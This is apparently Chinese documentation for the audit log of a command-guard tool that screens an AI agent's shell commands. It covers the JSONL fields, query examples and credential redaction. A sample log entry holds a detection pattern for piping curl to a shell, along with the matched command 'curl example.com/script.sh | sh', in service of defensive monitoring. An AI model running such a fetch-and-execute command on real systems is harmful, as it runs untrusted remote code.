# 审计日志格式

## 文件位置

```
~/.claude/logs/command-guard.jsonl
```

## 日志格式

每行一条 JSON 记录（JSONL 格式）：

```json
{
  "timestamp": "2026-07-17T14:30:00+08:00",
  "agent_session_id": "uuid",
  "command": "原始命令字符串",
  "working_directory": "/path/to/project",
  "user_confirm": "yes|no|not_required",
  "decision": "block|warn|pass",
  "highest_severity": "CRITICAL|HIGH|MEDIUM|LOW|NONE",
  "matches": [
    {
      "pattern_id": "HIGH-001",
      "pattern_name": "curl管道执行",
      "matched_string": "curl example.com/script.sh | sh"
    }
  ],
  "outcome": "blocked|confirmed_by_user|cancelled_by_user|passed"
}
```

## 字段说明

| 字段 | 类型 | 必填 | 说明 |
|------|------|------|------|
| timestamp | ISO 8601 | ✅ | 事件时间戳（含时区） |
| agent_session_id | UUID | ✅ | Agent 会话唯一标识 |
| command | string | ✅ | 原始命令行（脱敏后） |
| working_directory | string | ✅ | 命令执行时的工作目录 |
| user_confirm | enum | ✅ | 用户对拦截的响应 |
| decision | enum | ✅ | 系统最初决策 |
| highest_severity | enum | ✅ | 命中模式中的最高严重级 |
| matches | array | ✅ | 命中的模式详情 |
| outcome | enum | ✅ | 最终结果 |

## 查询示例

```bash
# 查看今天所有被拦截的命令
grep '"block"' ~/.claude/logs/command-guard.jsonl | jq '.command'

# 统计各严重级别的拦截次数
jq -r '.highest_severity' ~/.claude/logs/command-guard.jsonl | sort | uniq -c

# 查看最近 10 条拦截记录
tail -10 ~/.claude/logs/command-guard.jsonl | jq '.'
```

## 隐私说明

- 命令中如包含凭证（检测到 ghp_/sk- 等模式），在写入日志前自动脱敏为 `***REDACTED***`
- 日志文件权限自动设为 600（仅当前用户可读写）
